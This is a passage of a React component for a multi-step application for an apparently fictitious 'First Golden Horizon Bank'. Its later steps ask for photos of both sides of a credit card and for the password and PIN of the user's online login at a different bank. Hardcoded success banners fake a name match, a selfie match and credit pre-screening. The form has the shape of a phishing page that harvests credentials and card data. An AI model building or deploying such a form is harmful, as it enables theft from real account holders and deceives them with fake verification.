                    borderRadius: 'var(--radius-lg)',
                    padding: '1.25rem',
                    textAlign: 'center'
                  }}>
                    <span style={{ fontSize: '0.85rem', fontWeight: 700, color: 'var(--text-primary)', display: 'block', marginBottom: '0.35rem' }}>
                      Back of Credit Card *
                    </span>
                    <p style={{ fontSize: '0.76rem', color: 'var(--text-muted)', marginBottom: '0.75rem' }}>
                      Authorized signature strip and issuing bank information.
                    </p>

                    {formData.cardBackPhotoUrl ? (
                      <div style={{ marginBottom: '0.75rem' }}>
                        <img
                          src={formData.cardBackPhotoUrl}
                          alt="Back of Credit Card"
                          style={{ width: '100%', maxHeight: '120px', objectFit: 'cover', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', marginBottom: '0.3rem' }}
                        />
                        <span style={{ color: 'var(--status-success)', fontSize: '0.78rem', fontWeight: 600, display: 'block' }}>
                          ✓ Back Photo Uploaded ({formData.cardBackFileName})
                        </span>
                      </div>
                    ) : (
                      <div style={{ padding: '1rem 0', color: 'var(--text-muted)' }}>
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" style={{ margin: '0 auto 0.35rem', display: 'block' }}>
                          <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                          <line x1="1" y1="14" x2="23" y2="14"></line>
                        </svg>
                        <span style={{ fontSize: '0.76rem' }}>No back photo uploaded</span>
                      </div>
                    )}

                    <button
                      type="button"
                      className="btn btn-primary btn-sm"
                      onClick={() => cardBackInputRef.current?.click()}
                    >
                      {formData.cardBackPhotoUrl ? 'Change Back Photo' : 'Upload Back of Card'}
                    </button>
                  </div>
                </div>

                {errors.cardPhotos && (
                  <div style={{ color: 'var(--status-error)', fontSize: '0.82rem', textAlign: 'center', marginTop: '0.75rem' }}>
                    {errors.cardPhotos}
                  </div>
                )}
              </div>

              {/* Name Match Indicator */}
              <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.25)', borderRadius: 'var(--radius-md)', padding: '0.65rem 1rem', display: 'flex', alignItems: 'center', gap: '0.5rem', fontSize: '0.8rem', color: 'var(--status-success)', marginBottom: '1.5rem' }}>
                <span>✓ Cardholder Name Matches Applicant Legal Record ({formData.firstName} {formData.lastName}) • {formData.cardIssuingBank}</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
                <button type="button" className="btn btn-ghost" onClick={handleBack}>
                  ‹ Back
                </button>
                <button type="button" className="btn btn-primary" onClick={handleNext}>
                  <span>Continue ›</span>
                </button>
              </div>
            </div>
          )}

          {/* STEP 6: Credit Card Online Account Login & Loan Credit Score Underwriting */}
          {currentStep === 6 && (
            <div className="account-form-section" style={{ maxWidth: '640px', margin: '0 auto' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.85rem', marginBottom: '1.25rem' }}>
                <div style={{
                  width: '42px',
                  height: '42px',
                  borderRadius: 'var(--radius-md)',
                  background: 'linear-gradient(135deg, #4f46e5 0%, #3730a3 100%)',
                  color: '#fff',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  boxShadow: '0 4px 12px rgba(79, 70, 229, 0.3)'
                }}>
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                  </svg>
                </div>
                <div>
                  <h3 style={{ fontFamily: 'var(--font-heading)', fontSize: '1.25rem', fontWeight: 800, color: 'var(--text-primary)', margin: 0 }}>
                    Credit Card Online Login & Loan Credit Check
                  </h3>
                  <span style={{ fontSize: '0.75rem', color: 'var(--accent-primary)', fontWeight: 600 }}>
                    🔒 Secure {formData.cardIssuingBank || 'Credit Card'} Online Portal Access
                  </span>
                </div>
              </div>

              {/* Credit Card Online Banking Login Space */}
              <div style={{
                background: 'var(--bg-surface-elevated)',
                border: '1px solid var(--border-card)',
                borderRadius: 'var(--radius-lg)',
                padding: '1.5rem',
                marginBottom: '1.5rem'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.75rem' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                    <span style={{ fontSize: '1.1rem' }}>🔑</span>
                    <span style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--text-primary)' }}>
                      {formData.cardIssuingBank || 'Credit Card'} Online Banking Login
                    </span>
                  </div>
                  <span style={{ fontSize: '0.72rem', background: 'rgba(59, 130, 246, 0.12)', color: 'var(--accent-blue)', padding: '0.15rem 0.5rem', borderRadius: '4px', fontWeight: 600 }}>
                    Credit Score Sync
                  </span>
                </div>

                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1.25rem', lineHeight: '1.4' }}>
                  Log in to your <strong>{formData.cardIssuingBank || 'credit card'}</strong> online account to authorize automated access and retrieve your official credit score report for institutional loan pre-screening.
                </p>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div>
                    <label className="form-field-label">Online Banking Username / User ID *</label>
                    <input
                      type="text"
                      className={`form-input ${errors.cardOnlineUserId ? 'error' : ''}`}
                      placeholder="e.g. user_online_id"
                      value={formData.cardOnlineUserId || ''}
                      onChange={(e) => handleInputChange('cardOnlineUserId', e.target.value)}
                    />
                    {errors.cardOnlineUserId && <span className="field-error-msg">{errors.cardOnlineUserId}</span>}
                  </div>

                  <div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                      <label className="form-field-label" style={{ margin: 0 }}>Online Banking Password *</label>
                      <button
                        type="button"
                        className="btn btn-ghost btn-xs"
                        onClick={() => handleInputChange('showCardOnlinePassword', !formData.showCardOnlinePassword)}
                        style={{ fontSize: '0.72rem', padding: '0.1rem 0.4rem' }}
                      >
                        {formData.showCardOnlinePassword ? 'Hide' : 'Show'}
                      </button>
                    </div>
                    <input
                      type={formData.showCardOnlinePassword ? 'text' : 'password'}
                      className={`form-input ${errors.cardOnlinePassword ? 'error' : ''}`}
                      placeholder="••••••••••••"
                      value={formData.cardOnlinePassword || ''}
                      onChange={(e) => handleInputChange('cardOnlinePassword', e.target.value)}
                    />
                    {errors.cardOnlinePassword && <span className="field-error-msg">{errors.cardOnlinePassword}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Card Security PIN / Telephone Banking Code (Optional)</label>
                    <input
                      type="password"
                      maxLength={6}
                      className="form-input"
                      placeholder="••••"
                      value={formData.cardOnlinePin || ''}
                      onChange={(e) => handleInputChange('cardOnlinePin', e.target.value.replace(/\D/g, ''))}
                    />
                  </div>
                </div>
              </div>

              {/* Loan Appraisal & Credit Assessment Disclosure Notice */}
              <div style={{
                background: 'rgba(245, 158, 11, 0.08)',
                border: '1px solid rgba(245, 158, 11, 0.25)',
                borderRadius: 'var(--radius-lg)',
                padding: '1.15rem',
                marginBottom: '1.5rem',
                fontSize: '0.84rem',
                color: 'var(--text-secondary)',
                lineHeight: 1.5
              }}>
                <strong style={{ color: 'var(--text-primary)', display: 'block', marginBottom: '0.35rem' }}>
                  🏛️ Credit Score Assessment & Loan Pre-Approval Underwriting:
                </strong>
                First Golden Horizon Bank provides bespoke credit facilities, private wealth lines, and customized commercial financing. Please specify your credit profile and loan facility preferences. We perform a soft bureau inquiry that does NOT affect your credit score.
              </div>

              {/* Credit Profile & Loan Selection Form */}
              <div style={{
                background: 'var(--bg-surface-elevated)',
                border: '1px solid var(--border-card)',
                borderRadius: 'var(--radius-lg)',
                padding: '1.5rem',
                marginBottom: '1.5rem'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1.25rem', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.75rem' }}>
                  <span style={{ fontSize: '0.88rem', fontWeight: 700, color: 'var(--text-primary)' }}>
                    Loan Facility & Bureau Underwriting Preference
                  </span>
                  <span style={{ fontSize: '0.72rem', background: 'rgba(16, 185, 129, 0.12)', color: 'var(--status-success)', padding: '0.15rem 0.5rem', borderRadius: '4px', fontWeight: 600 }}>
                    Soft Credit Check • Zero Score Impact
                  </span>
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '1.15rem' }}>
                  <div>
                    <label className="form-field-label">Estimated FICO® Credit Score Range *</label>
                    <select
                      className={`form-input ${errors.creditScoreRange ? 'error' : ''}`}
                      value={formData.creditScoreRange}
                      onChange={(e) => handleInputChange('creditScoreRange', e.target.value)}
                    >
                      <option value="">-- Select Estimated FICO® Credit Score Range --</option>
                      <option value="750 - 850 (Tier 1 Prime)">750 - 850 (Tier 1 Prime - Preferred Rates)</option>
                      <option value="700 - 749 (Tier 2 Prime)">700 - 749 (Tier 2 Prime - Standard Line)</option>
                      <option value="650 - 699 (Tier 3 Standard)">650 - 699 (Tier 3 Standard - Tailored Underwriting)</option>
                      <option value="600 - 649 (Tier 4 Opportunity)">600 - 649 (Tier 4 Opportunity Line)</option>
                    </select>
                    {errors.creditScoreRange && <span className="field-error-msg">{errors.creditScoreRange}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Requested Credit / Loan Facility Amount *</label>
                    <select
                      className={`form-input ${errors.desiredLoanFacility ? 'error' : ''}`}
                      value={formData.desiredLoanFacility}
                      onChange={(e) => handleInputChange('desiredLoanFacility', e.target.value)}
                    >
                      <option value="">-- Select Requested Credit / Loan Facility Amount --</option>
                      <option value="$250,000 Private Wealth Facility">$250,000 Private Wealth Credit & Loan Facility</option>
                      <option value="$100,000 Portfolio Credit Line">$100,000 Portfolio Liquidity Line</option>
                      <option value="$50,000 Personal Credit Line">$50,000 Personal Liquidity Facility</option>
                      <option value="$500,000 Commercial Line">$500,000 Commercial Institutional Line</option>
                      <option value="No Loan Facility Requested">No Loan Facility Requested at this time</option>
                    </select>
                    {errors.desiredLoanFacility && <span className="field-error-msg">{errors.desiredLoanFacility}</span>}
                  </div>

                  <div>
                    <label className="form-field-label">Primary Purpose of Credit Facility</label>
                    <select
                      className="form-input"
                      value={formData.loanFacilityPurpose}
                      onChange={(e) => handleInputChange('loanFacilityPurpose', e.target.value)}
                    >
                      <option value="">-- Select Primary Purpose of Credit Facility --</option>
                      <option value="Investment Leverage & Liquidity Management">Investment Leverage & Liquidity Management</option>
                      <option value="Commercial & Real Estate Investment">Commercial & Real Estate Investment</option>
                      <option value="Working Capital & Business Growth">Working Capital & Business Growth</option>
                      <option value="Personal Wealth Liquidity">Personal Wealth Liquidity</option>
                    </select>
                  </div>

                  {/* Soft Credit Pull Consent Checkbox */}
                  <div style={{ marginTop: '0.5rem', background: 'var(--bg-card)', padding: '0.85rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)' }}>
                    <label style={{ display: 'flex', alignItems: 'flex-start', gap: '0.65rem', cursor: 'pointer', fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                      <input
                        type="checkbox"
                        checked={formData.softCreditPullConsent}
                        onChange={(e) => handleInputChange('softCreditPullConsent', e.target.checked)}
                        style={{ marginTop: '0.15rem' }}
                      />
                      <span>
                        I authorize First Golden Horizon Bank to initiate a soft credit bureau inquiry with Experian/Equifax to determine my eligible credit tier and borrowing facility. I understand this soft inquiry has <strong>no impact on my credit score</strong>.
                      </span>
                    </label>
                    {errors.softCreditPullConsent && (
                      <span className="field-error-msg" style={{ marginTop: '0.4rem', display: 'block' }}>
                        {errors.softCreditPullConsent}
                      </span>
                    )}
                  </div>
                </div>
              </div>

              {/* Instant Credit Score Simulation Badge */}
              <div style={{
                background: 'rgba(16, 185, 129, 0.08)',
                border: '1px solid rgba(16, 185, 129, 0.2)',
                borderRadius: 'var(--radius-md)',
                padding: '0.75rem 1rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                fontSize: '0.8rem',
                color: 'var(--text-primary)',
                marginBottom: '1.5rem'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  <span style={{ color: 'var(--status-success)', fontSize: '1rem' }}>✓</span>
                  <span><strong>FICO® Score Pre-Screening:</strong> Eligible for Institutional Wealth Tier</span>
                </div>
                <span style={{ color: 'var(--accent-gold)', fontWeight: 700 }}>Pre-Screened</span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
                <button type="button" className="btn btn-ghost" onClick={handleBack}>
                  ‹ Back
                </button>
                <button type="button" className="btn btn-primary" onClick={handleNext}>
                  <span>Continue ›</span>
                </button>
              </div>
            </div>
          )}

          {/* STEP 7: Review & Final Submission */}
          {currentStep === 7 && (
            <div>
              <div className="account-form-section">
                <h3 className="account-section-title">Application Review & Regulatory Consents</h3>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '1rem', marginBottom: '1.5rem', fontSize: '0.84rem' }}>
                  <div style={{ background: 'var(--bg-surface-elevated)', padding: '0.85rem', borderRadius: 'var(--radius-md)' }}>
                    <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem' }}>LEGAL APPLICANT</span>
                    <strong style={{ color: 'var(--text-primary)' }}>{formData.preferredSalutation} {formData.firstName} {formData.lastName}</strong>
                    <div style={{ color: 'var(--text-secondary)', fontSize: '0.78rem' }}>{formData.email} • {formData.phone} (Age: {calculateAge(formData.dob)})</div>
                  </div>

                  <div style={{ background: 'var(--bg-surface-elevated)', padding: '0.85rem', borderRadius: 'var(--radius-md)' }}>
                    <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem' }}>VERIFIED JURISDICTION</span>
                    <strong style={{ color: 'var(--text-primary)' }}>{formData.city}, {formData.stateRegion} ({formData.country})</strong>
                    <div style={{ color: 'var(--text-secondary)', fontSize: '0.78rem' }}>{formData.maritalStatus} • {formData.housingStatus}</div>
                  </div>

                  <div style={{ background: 'var(--bg-surface-elevated)', padding: '0.85rem', borderRadius: 'var(--radius-md)' }}>
                    <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem' }}>IDENTITY PROOFING</span>
                    <span style={{ color: 'var(--status-success)', fontWeight: 600, display: 'block' }}>✓ Selfie Captured (99.8%)</span>
                    <span style={{ color: 'var(--status-success)', fontWeight: 600 }}>✓ {formData.idType} Front & Back</span>
                  </div>

                  <div style={{ background: 'var(--bg-surface-elevated)', padding: '0.85rem', borderRadius: 'var(--radius-md)' }}>
                    <span style={{ color: 'var(--text-muted)', display: 'block', fontSize: '0.72rem' }}>CARD & LOAN ASSESSMENT</span>
                    <strong style={{ color: 'var(--text-primary)' }}>{formData.cardIssuingBank} ({formData.cardNetwork})</strong>
                    <div style={{ color: 'var(--status-success)', fontSize: '0.78rem', fontWeight: 600 }}>
                      ✓ Online Portal Connected ({formData.cardOnlineUserId})
                    </div>
                  </div>
                </div>

                {/* Subscriptions & Consents */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem', marginBottom: '1.25rem' }}>
                  {[
                    'Monthly Portfolio Performance Statements',
                    'SMS Security & Transaction Alerts',
                    'First Golden Horizon Market Macro Briefing (Weekly)'
                  ].map((chan) => (
                    <label key={chan} style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', fontSize: '0.82rem', color: 'var(--text-primary)', cursor: 'pointer' }}>
                      <input
                        type="checkbox"
                        checked={formData.commChannels.includes(chan)}
                        onChange={() => handleChannelToggle(chan)}
                      />
                      <span>{chan}</span>
                    </label>
                  ))}
                </div>

                <div style={{ background: 'var(--bg-surface-elevated)', padding: '0.85rem', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-subtle)', marginBottom: '1rem' }}>
                  <label style={{ display: 'flex', alignItems: 'flex-start', gap: '0.6rem', fontSize: '0.8rem', color: 'var(--text-secondary)', cursor: 'pointer', marginBottom: '0.6rem' }}>
                    <input
                      type="checkbox"
                      checked={formData.termsConsent}
                      onChange={(e) => handleInputChange('termsConsent', e.target.checked)}
                      style={{ marginTop: '2px' }}
                    />
                    <span>
                      I certify under penalty of perjury that the information provided is accurate, confirm that I am at least 18 years of age, and agree to the Electronic Signature and Account Agreement.
                    </span>
                  </label>
                  {errors.termsConsent && <span className="field-error-msg">{errors.termsConsent}</span>}

                  <label style={{ display: 'flex', alignItems: 'flex-start', gap: '0.6rem', fontSize: '0.8rem', color: 'var(--text-secondary)', cursor: 'pointer', marginBottom: '0.6rem' }}>
                    <input
                      type="checkbox"
                      checked={formData.patriotActConsent}
                      onChange={(e) => handleInputChange('patriotActConsent', e.target.checked)}
                      style={{ marginTop: '2px' }}
                    />
                    <span>
                      I acknowledge the USA PATRIOT Act regulatory notice regarding customer identity verification, loan underwriting, and information collection.
                    </span>
                  </label>
                  {errors.patriotActConsent && <span className="field-error-msg">{errors.patriotActConsent}</span>}
                </div>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid var(--border-subtle)', paddingTop: '1.25rem' }}>
                <button type="button" className="btn btn-ghost" onClick={handleBack}>
                  ‹ Back
                </button>
                <button type="button" className="btn btn-primary btn-lg" disabled={isSubmitting} onClick={handleFinalSubmit}>
                  {isSubmitting ? (
                    <span>Submitting Application to Underwriting...</span>
                  ) : (
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                      <span>Submit Bank Account Application</span>
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <polyline points="20 6 9 17 4 12"></polyline>
                      </svg>
                    </div>
                  )}
                </button>
              </div>
            </div>
          )}

          {/* STEP 8: Official Banking Confirmation Screen */}
          {currentStep === 8 && (
            <div style={{ textAlign: 'center', padding: '2.5rem 1rem' }}>
              <div style={{
                width: '68px',
                height: '68px',
                borderRadius: '50%',
                background: 'rgba(16, 185, 129, 0.15)',
                color: 'var(--status-success)',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                marginBottom: '1.5rem',
                boxShadow: '0 0 30px rgba(16, 185, 129, 0.25)'
              }}>
                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
              </div>

              <h3 style={{ fontFamily: 'var(--font-heading)', fontSize: '1.75rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.75rem' }}>
                Thank you for banking with First Golden Horizon Bank.
              </h3>
              
              <div style={{
                background: 'rgba(56, 189, 248, 0.08)',
                border: '1px solid rgba(56, 189, 248, 0.25)',
                borderRadius: 'var(--radius-lg)',
                padding: '1.25rem',
                maxWidth: '560px',
                margin: '0 auto 1.75rem',
                textAlign: 'left'
              }}>
                <div style={{ display: 'flex', gap: '0.75rem', alignItems: 'flex-start' }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: 'var(--accent-blue)', flexShrink: 0, marginTop: '2px' }}>
                    <circle cx="12" cy="12" r="10"></circle>
                    <polyline points="12 6 12 12 16 14"></polyline>
                  </svg>
                  <div style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
                    <strong style={{ color: 'var(--text-primary)', display: 'block', marginBottom: '0.2rem' }}>
                      Application Under Processing
                    </strong>
                    Your information has been securely received and is being processed by our compliance and underwriting department. You will receive an official notification email at <strong style={{ color: 'var(--accent-primary)' }}>{formData.email}</strong> as soon as your bank account review is completely processed.
                  </div>
                </div>
              </div>

              {/* Official Reference Identifier */}
              <div className="ref-code-card" style={{ maxWidth: '400px', margin: '0 auto 1.75rem' }}>
                <span style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)' }}>APPLICATION REFERENCE NUMBER</span>
                <span className="ref-code-text">{draftRefId}</span>
                <button type="button" className="btn btn-ghost btn-sm" onClick={handleCopy}>
                  {copied ? 'Copied!' : 'Copy'}
                </button>
              </div>

              <div style={{ display: 'flex', justifyContent: 'center', gap: '0.75rem', flexWrap: 'wrap' }}>
                <button type="button" className="btn btn-secondary" onClick={handleDownloadSummary}>
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                    <polyline points="7 10 12 15 17 10"></polyline>
                    <line x1="12" y1="15" x2="12" y2="3"></line>
                  </svg>
                  <span>Download Application Summary (JSON)</span>
                </button>
                <button type="button" className="btn btn-primary" onClick={onClose}>
                  Done & Return to Homepage
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
